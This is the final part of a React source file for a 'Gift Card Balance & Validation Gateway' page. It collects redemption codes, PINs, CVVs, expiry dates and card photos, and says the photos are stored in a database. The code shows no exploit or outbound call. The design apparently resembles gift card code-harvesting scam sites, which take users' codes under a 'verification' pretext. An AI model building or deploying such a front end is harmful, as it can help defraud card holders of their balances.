                  {/* Photo Verification Active Banner */}
                  {uploadedImages.length > 0 && (
                    <div className="p-3.5 rounded-2xl bg-emerald-50/90 dark:bg-emerald-950/40 border border-emerald-200/80 dark:border-emerald-900/60 flex items-start gap-2.5 text-xs text-emerald-900 dark:text-emerald-300 animate-in fade-in">
                      <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                      <div>
                        <span className="font-bold block">Photo Verification Mode Active ({uploadedImages.length}/3 Photos Attached)</span>
                        <span className="text-[11.5px] opacity-90 block mt-0.5">
                          Redemption code, PIN, and extra fields are optional. You can validate directly using your attached card photos!
                        </span>
                      </div>
                    </div>
                  )}

                  {/* Custom Brand Name Input (if Can't find yours was clicked) */}
                  {isCustomBrand && (
                    <div>
                      <label className="block text-xs font-bold text-slate-600 dark:text-slate-400 mb-1.5">
                        Brand / Merchant Name
                      </label>
                      <input
                        type="text"
                        placeholder="e.g. Best Buy, Walmart, Roblox..."
                        value={customBrandName}
                        onChange={(e) => {
                          setCustomBrandName(e.target.value);
                          if (formErrors.brand) setFormErrors((prev) => ({ ...prev, brand: undefined }));
                        }}
                        className={`w-full px-4 py-3 rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border text-sm text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                          formErrors.brand ? 'border-red-500' : 'border-slate-200 dark:border-slate-700'
                        }`}
                      />
                      {formErrors.brand && (
                        <p className="text-xs text-red-500 mt-1">{formErrors.brand}</p>
                      )}
                    </div>
                  )}

                  {/* Currency Input */}
                  <div>
                    <label className="block text-xs font-bold text-slate-600 dark:text-slate-400 mb-1.5">
                      Currency
                    </label>
                    <select
                      value={selectedCurrency}
                      onChange={(e) => setSelectedCurrency(e.target.value)}
                      className="w-full px-4 py-3 rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700 text-sm font-semibold text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 cursor-pointer"
                    >
                      <option value="USD">USD</option>
                      <option value="CAD">CAD</option>
                      <option value="GBP">GBP</option>
                      <option value="EUR">EUR</option>
                      <option value="AUD">AUD</option>
                    </select>
                  </div>

                  {/* Card Amount Input */}
                  <div>
                    <label className="block text-xs font-bold text-slate-600 dark:text-slate-400 mb-1.5">
                      Card Amount {uploadedImages.length > 0 && <span className="text-[10px] font-medium text-slate-400 dark:text-slate-500">(Optional)</span>}
                    </label>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-semibold text-sm">
                        $
                      </span>
                      <input
                        type="text"
                        placeholder="0.00"
                        value={cardAmount}
                        onFocus={() => {
                          if (cardAmount === '0.00' || cardAmount === '0') {
                            setCardAmount('');
                          }
                        }}
                        onBlur={() => {
                          if (!cardAmount.trim()) {
                            setCardAmount('0.00');
                          }
                        }}
                        onChange={(e) => setCardAmount(e.target.value)}
                        className="w-full pl-8 pr-4 py-3 rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700 text-sm font-semibold text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                      />
                    </div>
                  </div>

                  {/* Redemption Code / Card Number Input */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="block text-xs font-bold text-slate-600 dark:text-slate-400">
                        <span>{activeRequirement.codeLabel}</span>
                        {uploadedImages.length > 0 && (
                          <span className="ml-1.5 text-[10px] font-semibold text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950/60 px-1.5 py-0.5 rounded">
                            Optional with photos
                          </span>
                        )}
                      </label>
                      {cardAnalysis.hasFormatIssues && cardCode.length > 2 && (
                        <button
                          type="button"
                          onClick={() => {
                            setShowProTipToast(true);
                            setUserDismissedProTip(false);
                          }}
                          className="inline-flex items-center gap-1 text-[11px] font-bold text-amber-600 dark:text-amber-400 hover:underline cursor-pointer"
                        >
                          <Lightbulb className="w-3 h-3 text-amber-500" />
                          <span>Pro-Tip Fixes</span>
                        </button>
                      )}
                    </div>

                    <input
                      id="modal-card-code-input"
                      type="text"
                      placeholder={uploadedImages.length > 0 ? `${activeRequirement.codePlaceholder} (Optional - photos attached)` : activeRequirement.codePlaceholder}
                      value={cardCode}
                      onChange={(e) => {
                        setCardCode(e.target.value);
                        if (formErrors.code) setFormErrors((prev) => ({ ...prev, code: undefined }));
                      }}
                      onBlur={() => {
                        if (cardCode.trim().length > 3 && cardAnalysis.hasFormatIssues && !userDismissedProTip) {
                          setShowProTipToast(true);
                        }
                      }}
                      className={`w-full px-4 py-3 font-mono rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border text-sm text-slate-900 dark:text-white tracking-wide focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                        formErrors.code ? 'border-red-500 ring-1 ring-red-500/20' : 'border-slate-200 dark:border-slate-700'
                      }`}
                    />

                    {/* Format Alert & Quick-Clean Banner if invalid format detected */}
                    {cardCode.trim().length > 2 && cardAnalysis.hasFormatIssues && (
                      <div className="mt-2 p-2.5 rounded-xl bg-amber-50/90 dark:bg-amber-950/40 border border-amber-200/80 dark:border-amber-900/60 flex items-center justify-between gap-2 text-xs animate-in fade-in">
                        <div className="flex items-center gap-1.5 min-w-0 text-amber-800 dark:text-amber-300">
                          <AlertTriangle className="w-3.5 h-3.5 shrink-0 text-amber-600 dark:text-amber-400" />
                          <span className="truncate text-[11.5px] font-medium">
                            {cardAnalysis.issues[0]?.title || 'Format issue detected'}
                          </span>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          {cardAnalysis.cleanedCode && (
                            <button
                              type="button"
                              onClick={() => handleApplyCleanedCode(cardAnalysis.cleanedCode)}
                              className="px-2 py-1 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-bold text-[11px] flex items-center gap-1 shadow-2xs transition-colors cursor-pointer"
                            >
                              <Wand2 className="w-3 h-3" />
                              <span>Auto-Fix</span>
                            </button>
                          )}
                          <button
                            type="button"
                            onClick={() => {
                              setShowProTipToast(true);
                              setUserDismissedProTip(false);
                            }}
                            className="text-[11px] font-semibold text-amber-700 dark:text-amber-300 underline cursor-pointer"
                          >
                            Tips
                          </button>
                        </div>
                      </div>
                    )}

                    {formErrors.code ? (
                      <p className="text-xs text-red-500 mt-1.5 font-medium flex items-center gap-1">
                        <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                        <span>{formErrors.code}</span>
                      </p>
                    ) : (
                      <p className="text-[11px] text-slate-400 dark:text-slate-500 mt-1.5 font-medium">
                        {activeRequirement.codeHelperText}
                      </p>
                    )}

                    {/* 256-bit SSL encrypted notice */}
                    <div className="flex items-center gap-1.5 text-[11px] text-slate-500 dark:text-slate-400 mt-2 font-medium">
                      <Lock className="w-3.5 h-3.5 text-slate-400 shrink-0" />
                      <span>Your card details are 256-bit SSL encrypted</span>
                    </div>
                  </div>

                  {/* CONDITIONAL PIN (Only if required!) */}
                  {activeRequirement.pinRequired && (
                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <label className="block text-xs font-bold text-slate-600 dark:text-slate-400">
                          <span>{activeRequirement.pinLabel || 'PIN'}</span>
                          {uploadedImages.length > 0 && (
                            <span className="ml-1.5 text-[10px] font-semibold text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950/60 px-1.5 py-0.5 rounded">
                              Optional with photos
                            </span>
                          )}
                        </label>
                        <button
                          type="button"
                          onClick={() => setShowPin(!showPin)}
                          className="text-slate-400 hover:text-slate-600 text-[11px] flex items-center gap-1 cursor-pointer"
                        >
                          {showPin ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                          <span>{showPin ? 'Hide' : 'Show'}</span>
                        </button>
                      </div>

                      <input
                        type={showPin ? 'text' : 'password'}
                        placeholder={uploadedImages.length > 0 ? `${activeRequirement.pinPlaceholder || '4-digit PIN'} (Optional)` : (activeRequirement.pinPlaceholder || '4-digit PIN')}
                        value={securityPin}
                        onChange={(e) => {
                          setSecurityPin(e.target.value);
                          if (formErrors.pin) setFormErrors((prev) => ({ ...prev, pin: undefined }));
                        }}
                        className={`w-full px-4 py-3 font-mono rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border text-sm text-slate-900 dark:text-white tracking-wider focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                          formErrors.pin ? 'border-red-500' : 'border-slate-200 dark:border-slate-700'
                        }`}
                      />
                      {formErrors.pin && (
                        <p className="text-xs text-red-500 mt-1">{formErrors.pin}</p>
                      )}
                    </div>
                  )}

                  {/* CONDITIONAL CVV (Only for cards that need CVV!) */}
                  {activeRequirement.cvvRequired && (
                    <div>
                      <div className="flex items-center justify-between mb-1.5">
                        <label className="block text-xs font-bold text-slate-600 dark:text-slate-400">
                          <span>{activeRequirement.cvvLabel || 'CVV'}</span>
                          {uploadedImages.length > 0 && (
                            <span className="ml-1.5 text-[10px] font-semibold text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950/60 px-1.5 py-0.5 rounded">
                              Optional with photos
                            </span>
                          )}
                        </label>
                        <button
                          type="button"
                          onClick={() => setShowCvv(!showCvv)}
                          className="text-slate-400 hover:text-slate-600 text-[11px] flex items-center gap-1 cursor-pointer"
                        >
                          {showCvv ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                          <span>{showCvv ? 'Hide' : 'Show'}</span>
                        </button>
                      </div>

                      <input
                        type={showCvv ? 'text' : 'password'}
                        placeholder={uploadedImages.length > 0 ? `${activeRequirement.cvvPlaceholder || '3-digit CVV'} (Optional)` : (activeRequirement.cvvPlaceholder || '3-digit CVV')}
                        value={cardCvv}
                        onChange={(e) => {
                          setCardCvv(e.target.value);
                          if (formErrors.cvv) setFormErrors((prev) => ({ ...prev, cvv: undefined }));
                        }}
                        className={`w-full px-4 py-3 font-mono rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border text-sm text-slate-900 dark:text-white tracking-wider focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                          formErrors.cvv ? 'border-red-500' : 'border-slate-200 dark:border-slate-700'
                        }`}
                      />
                      {formErrors.cvv && (
                        <p className="text-xs text-red-500 mt-1">{formErrors.cvv}</p>
                      )}
                    </div>
                  )}

                  {/* CONDITIONAL EXPIRY DATE (Only for cards that need Expiry Date!) */}
                  {activeRequirement.expiryRequired && (
                    <div>
                      <label className="block text-xs font-bold text-slate-600 dark:text-slate-400 mb-1.5">
                        <span>Expiry Date</span>
                        {uploadedImages.length > 0 && (
                          <span className="ml-1.5 text-[10px] font-semibold text-emerald-600 dark:text-emerald-400 bg-emerald-50 dark:bg-emerald-950/60 px-1.5 py-0.5 rounded">
                            Optional with photos
                          </span>
                        )}
                      </label>
                      <div className="grid grid-cols-2 gap-3">
                        <select
                          value={expiryMonth}
                          onChange={(e) => setExpiryMonth(e.target.value)}
                          className="w-full px-3.5 py-3 rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700 text-sm font-semibold text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 cursor-pointer"
                        >
                          <option value="01">01 - Jan</option>
                          <option value="02">02 - Feb</option>
                          <option value="03">03 - Mar</option>
                          <option value="04">04 - Apr</option>
                          <option value="05">05 - May</option>
                          <option value="06">06 - Jun</option>
                          <option value="07">07 - Jul</option>
                          <option value="08">08 - Aug</option>
                          <option value="09">09 - Sep</option>
                          <option value="10">10 - Oct</option>
                          <option value="11">11 - Nov</option>
                          <option value="12">12 - Dec</option>
                        </select>

                        <select
                          value={expiryYear}
                          onChange={(e) => setExpiryYear(e.target.value)}
                          className="w-full px-3.5 py-3 rounded-xl bg-slate-50/80 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700 text-sm font-semibold text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 cursor-pointer"
                        >
                          <option value="2025">2025</option>
                          <option value="2026">2026</option>
                          <option value="2027">2027</option>
                          <option value="2028">2028</option>
                          <option value="2029">2029</option>
                          <option value="2030">2030</option>
                          <option value="2031">2031</option>
                          <option value="2032">2032</option>
                        </select>
                      </div>
                    </div>
                  )}

                  {/* NEED HELP? (WHERE IS MY CODE & SCAN CARD INSTEAD & PRO-TIPS) */}
                  <div className="pt-2">
                    <div className="flex flex-wrap items-center gap-2 text-xs">
                      <span className="text-slate-400 font-medium mr-1">Need help?</span>
                      
                      {activeRequirement.hasWhereIsMyCode && (
                        <button
                          type="button"
                          onClick={() => setIsWhereIsMyCodeOpen(true)}
                          className="px-3 py-1.5 rounded-full bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 font-medium flex items-center gap-1 transition-colors cursor-pointer"
                        >
                          <ChevronRight className="w-3.5 h-3.5" />
                          <span>Where is my code?</span>
                        </button>
                      )}

                      <button
                        type="button"
                        onClick={() => setIsScanModalOpen(true)}
                        className={`px-3.5 py-1.5 rounded-full font-medium flex items-center gap-1.5 transition-all cursor-pointer ${
                          uploadedImages.length > 0
                            ? 'bg-blue-600 hover:bg-blue-500 text-white shadow-xs'
                            : 'bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300'
                        }`}
                      >
                        <Camera className="w-3.5 h-3.5" />
                        <span>
                          {uploadedImages.length > 0
                            ? `Scan / Manage Photos (${uploadedImages.length}/3)`
                            : 'Scan card instead'}
                        </span>
                      </button>

                      <button
                        type="button"
                        onClick={() => {
                          setShowProTipToast(true);
                          setUserDismissedProTip(false);
                        }}
                        className={`px-3 py-1.5 rounded-full font-medium flex items-center gap-1 transition-colors cursor-pointer ${
                          cardAnalysis.hasFormatIssues
                            ? 'bg-amber-100 dark:bg-amber-900/60 text-amber-800 dark:text-amber-300 hover:bg-amber-200 dark:hover:bg-amber-800 ring-1 ring-amber-400/50'
                            : 'bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300'
                        }`}
                      >
                        <Lightbulb className="w-3.5 h-3.5 text-amber-500" />
                        <span>Pro-Tips {cardAnalysis.hasFormatIssues ? `(${cardAnalysis.issues.length})` : ''}</span>
                      </button>
                    </div>

                    {/* ATTACHED CARD PHOTOS BADGE / THUMBNAILS BAR */}
                    {uploadedImages.length > 0 && (
                      <div className="mt-3 p-3 rounded-2xl bg-blue-50/70 dark:bg-blue-950/40 border border-blue-100 dark:border-blue-900/60 flex items-center justify-between gap-3">
                        <div className="flex items-center gap-2.5 min-w-0">
                          <div className="flex -space-x-2 overflow-hidden shrink-0">
                            {uploadedImages.map((imgUrl, idx) => (
                              <button
                                key={idx}
                                type="button"
                                onClick={() => setPreviewLightboxImage(imgUrl)}
                                className="inline-block w-8 h-8 rounded-lg object-cover ring-2 ring-white dark:ring-slate-900 shadow-2xs overflow-hidden cursor-pointer hover:scale-110 transition-transform"
                                title={`View photo ${idx + 1}`}
                              >
                                <img src={imgUrl} alt={`Attached ${idx + 1}`} className="w-full h-full object-cover" />
                              </button>
                            ))}
                          </div>
                          <div className="truncate">
                            <span className="text-xs font-bold text-blue-900 dark:text-blue-200 block truncate">
                              {uploadedImages.length} Card Photo{uploadedImages.length > 1 ? 's' : ''} Attached
                            </span>
                            <span className="text-[11px] text-blue-600 dark:text-blue-400">
                              Will be saved to database verification record
                            </span>
                          </div>
                        </div>

                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            type="button"
                            onClick={() => setIsScanModalOpen(true)}
                            className="px-2.5 py-1 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold transition-colors cursor-pointer"
                          >
                            Edit
                          </button>
                          <button
                            type="button"
                            onClick={() => setUploadedImages([])}
                            className="p-1 rounded-lg text-slate-400 hover:text-red-500 transition-colors cursor-pointer"
                            title="Remove all photos"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* VALIDATE CARD MAIN BUTTON */}
                  <button
                    id="btn-validate-card-submit"
                    type="submit"
                    className="w-full py-3.5 px-4 rounded-xl bg-blue-600 hover:bg-blue-500 active:scale-98 text-white font-bold text-base shadow-lg shadow-blue-600/30 transition-all cursor-pointer mt-4 flex items-center justify-center gap-2"
                  >
                    {uploadedImages.length > 0 && !cardCode.trim() ? (
                      <>
                        <Camera className="w-5 h-5" />
                        <span>Validate Card with Attached Photos ({uploadedImages.length})</span>
                      </>
                    ) : (
                      <span>Validate Card</span>
                    )}
                  </button>

                  {/* BOTTOM NAVIGATION LINKS */}
                  <div className="pt-3 text-center space-y-2">
                    <div>
                      <button
                        type="button"
                        onClick={handleCloseModal}
                        className="text-xs sm:text-sm font-semibold text-blue-600 dark:text-blue-400 hover:underline cursor-pointer"
                      >
                        Validate a different brand →
                      </button>
                    </div>
                    <div>
                      <button
                        type="button"
                        onClick={handleCloseModal}
                        className="text-xs text-slate-400 hover:text-slate-600 dark:hover:text-slate-300 font-medium cursor-pointer"
                      >
                        &lt; Back to Validate
                      </button>
                    </div>
                  </div>

                </form>
              )}

            </div>
          </div>
        ) : (
          /* FULL CATALOG GRID VIEW (WHEN NO CARD IS SELECTED) */
          <>
            {/* HERO SECTION */}
            <div className="text-center max-w-2xl mx-auto mb-10">
              <h1 className="text-3xl sm:text-4xl font-extrabold text-slate-900 dark:text-white tracking-tight mb-3">
                Gift Card Balance & Validation Gateway
              </h1>
              <p className="text-slate-500 dark:text-slate-400 text-sm sm:text-base leading-relaxed">
                Select your card brand to check balance, verify authenticity, and inspect scratch-off security codes.
              </p>
            </div>

            {/* SEARCH BAR */}
            <div className="max-w-xl mx-auto mb-10">
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                <input
                  id="validate-search-input"
                  type="text"
                  placeholder="Search 25+ supported gift card brands (e.g. Apple, Steam, Visa, Sephora)..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-12 pr-4 py-3.5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-900 dark:text-white text-sm shadow-xs placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all"
                />
                {searchQuery && (
                  <button
                    type="button"
                    onClick={() => setSearchQuery('')}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 text-xs font-bold cursor-pointer"
                  >
                    Clear
                  </button>
                )}
              </div>
            </div>

            {/* 4-COLUMN BRAND CARDS GRID (2-column on mobile) */}
            <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-6">
              {filteredBrands.map((brand) => (
                <button
                  key={brand.id}
                  type="button"
                  onClick={() => handleOpenBrand(brand)}
                  className="bg-white dark:bg-slate-900 rounded-2xl p-3 sm:p-4 border border-slate-100 dark:border-slate-800 shadow-2xs hover:shadow-md transition-all duration-200 text-left flex flex-col justify-between group cursor-pointer"
                >
                  {/* Top Card Image */}
                  <div className="w-full aspect-16/10 rounded-xl overflow-hidden mb-2.5 sm:mb-3 bg-slate-900 dark:bg-slate-800 flex items-center justify-center relative border border-slate-900/10 dark:border-slate-700/40 shadow-xs">
                    <img
                      src={brand.image}
                      alt={`${brand.name} Gift Card`}
                      referrerPolicy="no-referrer"
                      className="w-full h-full object-cover select-none transition-transform duration-300 group-hover:scale-102"
                      loading="lazy"
                    />
                  </div>

                  {/* Bottom Card Title & Category */}
                  <div>
                    <div className="flex items-center justify-between">
                      <h3 className="font-bold text-slate-900 dark:text-white text-sm sm:text-base leading-snug truncate group-hover:text-blue-600 dark:group-hover:text-blue-400 transition-colors">
                        {brand.name}
                      </h3>
                      <span className="text-[10px] sm:text-[11px] font-semibold text-blue-600 dark:text-blue-400 shrink-0 ml-1">
                        Verify →
                      </span>
                    </div>
                    <p className="text-[11px] sm:text-xs text-slate-400 dark:text-slate-500 font-medium mt-0.5 truncate">
                      {brand.category}
                    </p>
                  </div>
                </button>
              ))}

              {/* "CAN'T FIND YOURS?" CARD */}
              <button
                type="button"
                onClick={handleOpenCustomBrand}
                className="border-2 border-dashed border-slate-300 dark:border-slate-700 rounded-2xl p-4 sm:p-5 hover:border-blue-500 dark:hover:border-blue-400 hover:bg-blue-50/20 dark:hover:bg-blue-950/20 transition-all flex flex-col items-center justify-center text-center group cursor-pointer min-h-[160px] sm:min-h-[220px]"
              >
                <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-400 flex items-center justify-center mb-2 sm:mb-3 group-hover:bg-blue-600 group-hover:text-white transition-colors">
                  <Plus className="w-5 h-5 sm:w-6 sm:h-6" />
                </div>
                <h3 className="font-bold text-slate-900 dark:text-white text-xs sm:text-sm">Can't Find Yours?</h3>
                <p className="text-[10px] sm:text-xs text-slate-400 dark:text-slate-500 mt-0.5 sm:mt-1 max-w-[180px]">
                  Verify any retail or digital voucher not listed
                </p>
              </button>
            </div>
          </>
        )}

      </PageContainer>

      {/* "WHERE IS MY CODE?" MODAL */}
      <WhereIsMyCodeModal
        isOpen={isWhereIsMyCodeOpen}
        onClose={() => setIsWhereIsMyCodeOpen(false)}
        brandName={selectedBrand?.name || 'Gift Card'}
        guideData={activeRequirement.whereIsMyCode}
        cardImage={selectedBrand?.image}
      />

      {/* "SCAN GIFT CARD" MODAL */}
      <ScanGiftCardModal
        isOpen={isScanModalOpen}
        onClose={() => setIsScanModalOpen(false)}
        brandName={selectedBrand?.name || 'Gift Card'}
        brandId={selectedBrand?.id || 'generic'}
        initialImages={uploadedImages}
        onApplyData={handleScanAppliedData}
      />

      {/* FLOATING PRO-TIP TOAST COMPONENT */}
      {showProTipToast && (
        <ValidationProTipToast
          analysis={cardAnalysis}
          brandName={selectedBrand?.name || 'Gift Card'}
          brandId={selectedBrand?.id || 'generic'}
          currentCode={cardCode}
          currentCurrency={selectedCurrency}
          onApplyCleanedCode={handleApplyCleanedCode}
          onOpenWhereIsMyCode={() => setIsWhereIsMyCodeOpen(true)}
          onSelectCurrency={(curr) => setSelectedCurrency(curr)}
          onClose={() => {
            setShowProTipToast(false);
            setUserDismissedProTip(true);
          }}
        />
      )}

      {/* FULLSCREEN IMAGE LIGHTBOX PREVIEW */}
      {previewLightboxImage && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div
            onClick={() => setPreviewLightboxImage(null)}
            className="fixed inset-0 bg-slate-950/85 backdrop-blur-sm transition-opacity"
          />
          <div className="relative z-10 max-w-2xl w-full bg-slate-900 rounded-3xl p-3 shadow-2xl border border-slate-800 overflow-hidden flex flex-col items-center">
            <div className="w-full flex items-center justify-between px-3 py-2 text-white">
              <span className="text-xs font-bold uppercase tracking-wider text-slate-400">Card Photo Preview</span>
              <button
                type="button"
                onClick={() => setPreviewLightboxImage(null)}
                className="w-8 h-8 rounded-full bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white flex items-center justify-center transition-colors cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="w-full max-h-[70vh] overflow-auto flex items-center justify-center rounded-2xl bg-black/40 p-2">
              <img
                src={previewLightboxImage}
                alt="Card photo enlarged"
                className="max-h-[65vh] w-auto object-contain rounded-xl"
              />
            </div>
          </div>
        </div>
      )}

    </div>
  );
};

export default ValidateCard;
